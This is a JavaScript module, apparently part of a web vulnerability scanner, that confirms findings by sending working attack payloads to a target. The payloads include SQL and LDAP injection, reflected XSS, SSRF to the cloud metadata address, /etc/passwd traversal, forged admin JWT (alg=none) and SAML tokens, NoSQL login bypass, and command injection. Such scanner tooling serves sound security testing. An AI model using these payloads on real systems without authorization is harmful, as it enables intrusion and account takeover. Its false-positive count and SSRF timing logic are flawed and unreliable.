import { getFindings, updateFinding, removeFalsePositives } from './findings.js';
import { fetchText } from '../utils/fetch.js';

export async function validateFindings(origin, spinner) {
  const findings = getFindings();
  let validated = 0;
  let fpRemoved = 0;

  for (let i = 0; i < findings.length; i++) {
    const f = findings[i];
    spinner.text = `Validating: ${f.module} [${validated + 1}/${findings.length}]`;

    try {
      switch (true) {
        case f.title.toLowerCase().includes('sql injection'):
          await validateSqli(origin, f, i);
          break;
        case f.title.toLowerCase().includes('xss'):
          await validateXss(origin, f, i);
          break;
        case f.title.toLowerCase().includes('ssrf'):
          await validateSsrf(origin, f, i);
          break;
        case f.title.toLowerCase().includes('lfi') || f.title.toLowerCase().includes('path traversal'):
          await validateLfi(origin, f, i);
          break;
        case f.title.toLowerCase().includes('jwt') && f.title.toLowerCase().includes('none'):
          await validateJwtNone(origin, f, i);
          break;
        case f.title.toLowerCase().includes('open redirect'):
          await validateOpenRedirect(origin, f, i);
          break;
        case f.title.toLowerCase().includes('cors'):
          await validateCors(origin, f, i);
          break;
        case f.title.toLowerCase().includes('nosql injection'):
          await validateNosql(origin, f, i);
          break;
        case f.title.toLowerCase().includes('command injection'):
          await validateCommandInjection(origin, f, i);
          break;
        case f.title.toLowerCase().includes('no clickjacking') || f.title.toLowerCase().includes('x-frame-options'):
          await validateClickjacking(origin, f, i);
          break;
        case f.title.toLowerCase().includes('missing') && f.module === 'HTTP Headers':
          await validateHeaders(origin, f, i);
          break;
        case f.title.toLowerCase().includes('accessible') && f.module === 'Exposed Files':
          await validateExposedFile(origin, f, i);
          break;
        case f.title.toLowerCase().includes('saml'):
          await validateSaml(origin, f, i);
          break;
        case f.title.toLowerCase().includes('ldap'):
          await validateLdap(origin, f, i);
          break;
        case f.title.toLowerCase().includes('no csrf'):
          await validateCsrf(origin, f, i);
          break;
        case f.title.toLowerCase().includes('http method') && f.title.toLowerCase().includes('trace'):
          await validateTrace(origin, f, i);
          break;
        default:
          await genericValidation(origin, f, i);
      }
    } catch {}

    validated++;
  }

  fpRemoved = findings.length - getFindings().length;
  removeFalsePositives();

  spinner.text = `Validation complete: ${validated}d ${fpRemoved} FP removed`;
  return { validated, falsePositivesRemoved: fpRemoved };
}

async function validateSqli(origin, f, idx) {
  const testUrl = origin + '/?id=1%27%20UNION%20SELECT%20NULL--';
  try {
    const resp = await fetchText(testUrl, {}, 8000);
    if (/UNION|SELECT|syntax|error.*SQL|mysql|postgresql|sqlite|ORA-|Microsoft SQL/i.test(resp.body)) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 90, validationNote: 'Database error confirmed via UNION SELECT probe' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 45, validationNote: 'No database error on UNION probe — may be parameterized or WAF-blocked' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 30, validationNote: 'Validation request failed (timeout/connection error)' });
  }
}

async function validateXss(origin, f, idx) {
  const testUrl = origin + '/?q=<script>alert(1)<%2fscript>';
  try {
    const resp = await fetchText(testUrl, {}, 5000);
    if (resp.body.includes('<script>alert(1)')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 95, validationNote: 'XSS payload reflected unescaped in response' });
    } else if (resp.body.includes('alert(1)')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 80, validationNote: 'alert(1) reflected but script tags may be stripped' });
    } else if (resp.body.includes('&lt;script&gt;') || resp.body.includes('&lt;')) {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 15, validationNote: 'Input properly HTML-encoded — XSS unlikely' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 40, validationNote: 'Payload not reflected — may be parameter-specific' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 25, validationNote: 'Validation request failed' });
  }
}

async function validateSsrf(origin, f, idx) {
  try {
    const startTime = Date.now();
    await fetchText(origin + '/?url=http://169.254.169.254/latest/meta-data/', {}, 8000);
    const elapsed = Date.now() - startTime;

    if (elapsed < 1000) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 85, validationNote: `Metadata endpoint responded quickly (${elapsed}ms) — SSRF likely` });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 50, validationNote: `Response took ${elapsed}ms — may be blocked or timing out` });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 30, validationNote: 'SSRF probe timed out or connection refused' });
  }
}

async function validateLfi(origin, f, idx) {
  try {
    const resp = await fetchText(origin + '/?file=../../../etc/passwd', {}, 5000);
    if (resp.body.includes('root:x:0:')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 98, validationNote: '/etc/passwd file retrieved successfully' });
    } else if (resp.body.includes('root') && resp.body.includes('/bin/')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 85, validationNote: 'File contents contain system paths — LFI likely' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 35, validationNote: 'No passwd data returned — try different encoding bypasses' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 20, validationNote: 'LFI probe failed' });
  }
}

async function validateJwtNone(origin, f, idx) {
  const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  const payload = btoa(JSON.stringify({ sub: 'admin', role: 'admin', exp: 9999999999 }));
  const token = `${header}.${payload}.`;

  try {
    const resp = await fetchText(origin + '/api/me', {
      headers: { Authorization: `Bearer ${token}` },
    }, 5000);

    if (resp.status === 200) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 99, validationNote: 'JWT alg=none accepted — complete auth bypass' });
    } else if (resp.status === 401 || resp.status === 403) {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 10, validationNote: 'Server rejected unsigned JWT — "none" attack blocked' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 40, validationNote: `Unexpected response ${resp.status}` });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 25, validationNote: 'JWT validation failed' });
  }
}

async function validateOpenRedirect(origin, f, idx) {
  try {
    const resp = await fetchText(origin + '/?redirect=https://evil.com', { redirect: 'manual' }, 5000);
    const location = resp.headers['location'] || '';

    if (location.includes('evil.com')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 95, validationNote: 'Redirect to external domain confirmed' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 20, validationNote: 'Redirect blocked or sanitized' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 30, validationNote: 'Redirect validation failed' });
  }
}

async function validateCors(origin, f, idx) {
  try {
    const resp = await fetchText(origin, { headers: { Origin: 'https://evil.com' } });
    const acao = resp.headers['access-control-allow-origin'] || '';
    const acac = resp.headers['access-control-allow-credentials'] || '';

    if (acao === '*' && acac === 'true') {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 98, validationNote: 'CORS wildcard with credentials — full cross-origin data theft' });
    } else if (acao === 'https://evil.com') {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 90, validationNote: 'CORS reflects arbitrary origin' });
    } else if (acao === 'null') {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 75, validationNote: 'CORS allows null origin' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 15, validationNote: 'CORS does not reflect test origin' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 25, validationNote: 'CORS validation failed' });
  }
}

async function validateNosql(origin, f, idx) {
  try {
    const resp = await fetchText(origin + '/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: { $ne: '' }, password: { $ne: '' } }),
    }, 5000);

    if (resp.status === 200 && /token|session|success|welcome|user/i.test(resp.body)) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 95, validationNote: 'NoSQL auth bypass confirmed — $ne operator accepted' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 40, validationNote: 'NoSQL auth bypass not directly confirmed' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 25, validationNote: 'NoSQL validation failed' });
  }
}

async function validateCommandInjection(origin, f, idx) {
  const startTime = Date.now();
  try {
    await fetchText(origin + '/?cmd=sleep+3', {}, 8000);
    const elapsed = Date.now() - startTime;

    if (elapsed > 2500) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 85, validationNote: `sleep 3 confirmed — response took ${elapsed}ms` });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 35, validationNote: `Response was ${elapsed}ms — sleep did not trigger` });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 20, validationNote: 'Command injection validation failed' });
  }
}

async function validateClickjacking(origin, f, idx) {
  try {
    const resp = await fetchText(origin);
    const xfo = resp.headers['x-frame-options'] || '';
    const csp = resp.headers['content-security-policy'] || '';

    if (!xfo && !csp.includes('frame-ancestors')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 85, validationNote: 'Confirmed — no X-Frame-Options or frame-ancestors CSP' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 5, validationNote: 'Clickjacking protection found on re-check' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 30, validationNote: 'Could not verify clickjacking' });
  }
}

async function validateHeaders(origin, f, idx) {
  try {
    const resp = await fetchText(origin);
    const headerName = f.title.toLowerCase().match(/missing ([\w-]+)/)?.[1] || '';

    if (headerName && resp.headers[headerName]) {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 5, validationNote: `${headerName} found on re-check — false positive` });
    } else if (headerName && !resp.headers[headerName]) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 90, validationNote: `Confirmed — ${headerName} still missing` });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 50, validationNote: 'Header presence could not be verified' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 30, validationNote: 'Header validation failed' });
  }
}

async function validateExposedFile(origin, f, idx) {
  const pathMatch = f.title.match(/Accessible: (.+)/);
  if (!pathMatch) {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 40, validationNote: 'Could not parse path from finding' });
    return;
  }

  try {
    const resp = await fetchText(origin + pathMatch[1], {}, 5000);
    if (resp.status === 200 && resp.body.length > 10) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 90, validationNote: `Confirmed — ${pathMatch[1]} still accessible (${resp.body.length}B)` });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 10, validationNote: `${pathMatch[1]} no longer accessible on re-check` });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 30, validationNote: 'File access validation failed' });
  }
}

async function validateSaml(origin, f, idx) {
  const acsEndpoints = ['/saml/acs', '/auth/saml/callback', '/sso/acs', '/Shibboleth.sso/SAML2/POST'];
  let confirmed = false;

  const unsignedResponse = `<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="test" Version="2.0"><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0"><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>`;
  const encoded = Buffer.from(unsignedResponse).toString('base64');

  for (const acs of acsEndpoints) {
    try {
      const resp = await fetchText(origin + acs, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `SAMLResponse=${encodeURIComponent(encoded)}`,
      }, 5000);

      if (resp.status === 200 || resp.status === 302) {
        confirmed = true;
        break;
      }
    } catch {}
  }

  if (confirmed) {
    updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 80, validationNote: 'Unsigned SAML response accepted — XSW attack confirmed' });
  } else {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 40, validationNote: 'SAML ACS did not accept unsigned response' });
  }
}

async function validateLdap(origin, f, idx) {
  try {
    const resp = await fetchText(origin + '/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: '*)(uid=*))(|(uid=*', password: 'test' }),
    }, 5000);

    if (resp.status === 200) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 90, validationNote: 'LDAP auth bypass confirmed via wildcard injection' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 35, validationNote: 'LDAP auth bypass not confirmed on re-check' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 25, validationNote: 'LDAP validation failed' });
  }
}

async function validateCsrf(origin, f, idx) {
  try {
    const resp = await fetchText(origin);
    const forms = (resp.body.match(/<form[^>]*method\s*=\s*['"](?:post|put|delete)['"][^>]*>/gi) || []);
    let missingCsrf = 0;

    for (const form of forms) {
      if (!/csrf|_token|authenticity_token/i.test(form)) missingCsrf++;
    }

    if (missingCsrf > 0) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 80, validationNote: `${missingCsrf} forms missing CSRF tokens confirmed` });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 10, validationNote: 'CSRF tokens found in all forms on re-check' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 25, validationNote: 'CSRF validation failed' });
  }
}

async function validateTrace(origin, f, idx) {
  try {
    const resp = await fetchText(origin, { method: 'TRACE' }, 5000);
    if (resp.status === 200 && resp.body.includes('TRACE')) {
      updateFinding(idx, { validated: true, exploitability: 'confirmed', confidence: 95, validationNote: 'TRACE method confirmed enabled — XST attack vector' });
    } else {
      updateFinding(idx, { validated: true, exploitability: 'rejected', confidence: 5, validationNote: 'TRACE method blocked or disabled' });
    }
  } catch {
    updateFinding(idx, { validated: true, exploitability: 'inconclusive', confidence: 20, validationNote: 'TRACE validation failed' });
  }
}

async function genericValidation(origin, f, idx) {
  updateFinding(idx, {
    validated: true,
    exploitability: 'inconclusive',
    confidence: 50,
    validationNote: 'Auto-validation not supported for this finding type — manual verification recommended',
  });
}

function btoa(str) {
  return Buffer.from(str).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}
